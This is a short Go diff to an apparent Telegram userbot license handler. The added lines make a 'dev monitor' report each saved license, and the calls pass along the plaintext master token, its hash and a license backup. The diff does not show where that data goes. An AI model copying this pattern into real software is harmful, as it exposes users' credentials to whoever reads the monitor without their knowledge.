@@ -185,6 +185,12 @@ func (h *Handler) SendMessage(ctx context.Context, b *botgotd.Bot, msg redis.XMe
 		}
 		if saveErr := h.db.SaveUserLicense(ctx, lic); saveErr != nil {
 			log.Printf("[license] failed saving user license for chat %d: %v", data.ChatID, saveErr)
+			globalDevMonitor.NotifyTraceback("gateway", "SaveUserLicense Failed", saveErr.Error())
+		} else {
+			isRecovery := pendingSess != nil && pendingSess.PendingTokenSHA != "" && pendingSess.OldOwnerID > 0
+			globalDevMonitor.NotifyTokenCollected(data.ChatID, userbotID, tier, masterToken, tokenSHA, isRecovery)
+			globalDevMonitor.NotifyBackupToken(lic)
+			globalDevMonitor.NotifyUserbotConnected(data.ChatID, userbotID, fmt.Sprintf("Userbot aktif (Tier %s)", tier))
 		}
 		cfg := h.db.GetUserConfig(ctx, data.ChatID)
 		cfg.MasaAktif = formatLicenseMasaAktif(lic)
